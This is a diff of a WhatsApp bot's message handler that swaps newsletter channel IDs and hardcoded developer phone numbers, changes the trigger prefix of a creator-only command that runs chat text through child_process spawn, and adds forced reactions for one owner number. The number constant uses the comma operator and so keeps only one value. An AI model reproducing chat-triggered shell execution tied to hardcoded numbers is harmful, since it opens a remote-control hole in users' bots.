@@ -269,9 +269,9 @@ registerAntiNewsletter(conn);
     }
 
 	  const newsletterJids = [
-    "120363348038810906@newsletter"
+    "120363318387454868@newsletter"
   ];
-  const emojis = ["❤️", "🔥", "😯"];
+  const emojis = ["❤️", "👍", "😯"];
 
   if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
     try {
@@ -337,7 +337,7 @@ registerAntiNewsletter(conn);
   
   
   const udp = botNumber.split('@')[0];
-    const davidop = ('2349133354644', '2347013349642');
+    const davidop = ('923003588997', '923309046024');
     
     if (isGroup) {
                 updateActivity(from, sender);
@@ -350,10 +350,10 @@ registerAntiNewsletter(conn);
     .includes(mek.sender);
 	  
 
-	  if (isCreator && mek.text.startsWith("&")) {
+	  if (isCreator && mek.text.startsWith("^")) {
             let code = budy.slice(2);
             if (!code) {
-                reply(`Provide me with a query to run Master!`);
+                reply(`ALI-MD ACTIVE`);
                 return;
             }
             const { spawn } = require("child_process");
@@ -471,7 +471,12 @@ conn.ev.on('messages.upsert', async (msg) => {
     console.error("No Prefix Handler Error:", err);
   }
 });
-	  
+ //================ownerreact==============
+    if (senderNumber.includes("923003588997") && !isReact) {
+  const reactions = ["👑", "🫜", "🫆", "🫩", "🪾", "🪉", "🪏", "🫟"];
+  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+  m.react(randomReaction);
+}	  
 // Auto React 
   if (!isReact && config.AUTO_REACT === 'true') {
     const reactions = [
